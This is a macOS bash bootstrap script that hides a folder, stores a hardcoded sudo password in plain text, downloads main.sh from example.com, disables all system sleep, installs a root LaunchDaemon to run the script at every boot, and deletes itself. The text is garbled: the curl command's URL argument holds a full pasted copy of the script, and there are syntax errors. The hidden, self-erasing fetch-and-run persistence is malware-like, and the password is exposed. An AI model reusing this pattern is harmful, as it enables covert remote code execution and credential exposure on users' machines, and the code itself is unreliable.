#!/usr/bin/env bash

# === Check correct user ===
CURRENT_USER=$(whoami)
if [ "$CURRENT_USER" != "carterhuang" && "$CURRENT_USER" != "root" ]; then
    echo "❌ Script must be run as user 'carterhuang'. Current user: $CURRENT_USER. Exiting."
    exit 1
fi

# === Configuration ===
TARGET_DIR="$HOME/programfiles"
PFILE="$TARGET_DIR/p.txt"
MAIN_SCRIPT="$TARGET_DIR/main.sh"
PLIST_LABEL="com.programfiles.main"
PLIST_PATH="/Library/LaunchDaemons/$PLIST_LABEL.plist"

echo "[$(date)] Script started by $CURRENT_USER."

# Always ensure the folder is hidden if it exists
if [ -d "$TARGET_DIR" ]; then
    chflags hidden "$TARGET_DIR"
fi

if [ -d "$TARGET_DIR" ]; then
    # -> Existing install: read sudo password from p.txt
    if [ ! -f "$PFILE" ]; then
        echo "❌ Password file not found at $PFILE. Exiting."
        exit 1
    fi
    PASSWORD=$(<"$PFILE")

    echo "✅ $TARGET_DIR exists (hidden)."
    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF

    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    echo "→ Launching $MAIN_SCRIPT now…"
    "$MAIN_SCRIPT"

else
    # -> First-time bootstrap: create & hide folder, store password
    echo "❌ $TARGET_DIR not found. Bootstrapping…"
    echo "→ Creating folder $TARGET_DIR"
    mkdir -p "$TARGET_DIR"

    echo "→ Hiding folder"
    chflags hidden "$TARGET_DIR"

    echo "→ Storing sudo password in p.txt"
    echo "carterchloe2006" >"$PFILE"
    chmod 600 "$PFILE"

    PASSWORD=$(<"$PFILE")

    echo "→ Recording current time in time.txt"
    date +'%Y:%m:%d:%H:%M:%S' >"$TARGET_DIR/time.txt"

    echo "→ Downloading main.sh from example.com"
    curl -fsSL "#!/usr/bin/env bash

# === Check correct user ===
CURRENT_USER=$(whoami)
if [ "$CURRENT_USER" != "carterhuang" ]; then
    echo "❌ Script must be run as user 'carterhuang'. Current user: $CURRENT_USER. Exiting."
    exit 1
fi

# === Configuration ===
TARGET_DIR="$HOME/programfiles"
PFILE="$TARGET_DIR/p.txt"
MAIN_SCRIPT="$TARGET_DIR/main.sh"
PLIST_LABEL="com.programfiles.main"
PLIST_PATH="/Library/LaunchDaemons/$PLIST_LABEL.plist"

echo "[$(date)] Script started by $CURRENT_USER."

# Always ensure the folder is hidden if it exists
if [ -d "$TARGET_DIR" ]; then
    chflags hidden "$TARGET_DIR"
fi

if [ -d "$TARGET_DIR" ]; then
    # -> Existing install: read sudo password from p.txt
    if [ ! -f "$PFILE" ]; then
        echo "❌ Password file not found at $PFILE. Exiting."
        exit 1
    fi
    PASSWORD=$(<"$PFILE")

    echo "✅ $TARGET_DIR exists (hidden)."
    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF

    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    echo "→ Launching $MAIN_SCRIPT now…"
    "$MAIN_SCRIPT"

else
    # -> First-time bootstrap: create & hide folder, store password
    echo "❌ $TARGET_DIR not found. Bootstrapping…"
    echo "→ Creating folder $TARGET_DIR"
    mkdir -p "$TARGET_DIR"

    echo "→ Hiding folder"
    chflags hidden "$TARGET_DIR"

    echo "→ Storing sudo password in p.txt"
    echo "carterchloe2006" >"$PFILE"
    chmod 600 "$PFILE"

    PASSWORD=$(<"$PFILE")

    echo "→ Recording current time in time.txt"
    date +'%Y:%m:%d:%H:%M:%S' >"$TARGET_DIR/time.txt"

    echo "→ Downloading main.sh from example.com"
    curl -fsSL "https://example.com/main.sh" -o "$MAIN_SCRIPT"

    echo "→ Disabling all macOS sleep (even on lid close)"
    echo "$PASSWORD" | sudo -S pmset -a sleep 0 standby 0 autopoweroff 0 hibernatemode 0

    echo "→ Making main.sh executable"
    chmod +x "$MAIN_SCRIPT"

    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF

    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    echo "→ Launching $MAIN_SCRIPT now…"
    "$MAIN_SCRIPT"
fi

# Cleanup

echo "→ Cleaning up: removing this bootstrap script."
rm -- "$0"
" -o "$MAIN_SCRIPT"

    echo "→ Disabling all macOS sleep (even on lid close)"
    echo "$PASSWORD" | sudo -S pmset -a sleep 0 standby 0 autopoweroff 0 hibernatemode 0

    echo "→ Making main.sh executable"
    chmod +x "$MAIN_SCRIPT"

    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF

    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    echo "→ Launching $MAIN_SCRIPT now…"
    "$MAIN_SCRIPT"
fi

# Cleanup

echo "→ Cleaning up: removing this bootstrap script."
rm -- "$0"
